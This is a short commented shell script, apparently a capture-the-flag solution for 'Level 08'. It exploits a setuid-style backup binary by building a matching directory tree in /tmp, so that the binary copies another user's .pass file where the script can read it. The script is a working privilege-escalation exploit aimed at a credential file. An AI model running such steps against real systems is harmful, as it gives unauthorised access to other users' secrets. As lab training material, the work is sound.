# Exploit for Level 08
# The binary backs up files to ./backups/ + filename
# We create the directory structure in /tmp and run it there

# 1. Create directory structure
mkdir -p /tmp/my_exploit/backups/home/users/level09

# 2. Change to our exploit directory
cd /tmp/my_exploit

# 3. Run the vulnerable binary
# It will try to write to ./backups/home/users/level09/.pass
# Since we created that path, it succeeds
/home/users/level08/level08 /home/users/level09/.pass

# 4. Read the flag
cat backups/home/users/level09/.pass

# 5. Cleanup (optional)
# rm -rf /tmp/my_exploit
